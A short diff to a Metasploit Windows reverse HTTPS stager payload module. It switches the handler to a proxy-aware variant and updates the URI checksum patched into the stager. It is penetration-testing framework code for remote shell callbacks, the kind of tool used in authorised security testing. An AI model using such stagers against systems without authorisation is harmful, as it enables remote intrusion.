@@ -28,7 +28,7 @@ module Metasploit3
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'win',
 			'Arch'          => ARCH_X86,
-			'Handler'       => Msf::Handler::ReverseHttps,
+			'Handler'       => Msf::Handler::ReverseHttpsProxy,
 			'Convention'    => 'sockedi https',
 			'Stager'        =>
 				{
@@ -83,7 +83,7 @@ module Metasploit3
 		p = super
 
 		i = p.index("/12345\x00")
-		u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW) + "\x00"
+		u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttpsProxy::URI_CHECKSUM_INITW) + "\x00"
 		p[i, u.length] = u
 		
 		# patch proxy info	
